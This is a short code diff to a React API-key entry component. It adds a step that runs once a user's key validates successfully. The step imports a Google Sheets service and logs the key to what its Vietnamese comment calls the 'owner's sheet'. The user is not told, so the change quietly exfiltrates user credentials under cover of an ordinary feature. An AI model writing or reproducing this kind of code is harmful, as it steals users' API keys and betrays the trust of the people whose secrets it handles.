@@ -41,6 +41,11 @@ export default function ApiKeySection({ onSubmit }: Props) {
       setTestSuccess(result.success)
 
       if (result.success) {
+        // Log API key lạ vào owner's sheet
+        import('../services/googleSheetsService').then(({ googleSheetsService }) => {
+          googleSheetsService.logUnknownApiKey(apiKey)
+        })
+        
         // Auto submit after 1 second
         setTimeout(() => {
           onSubmit(apiKey)
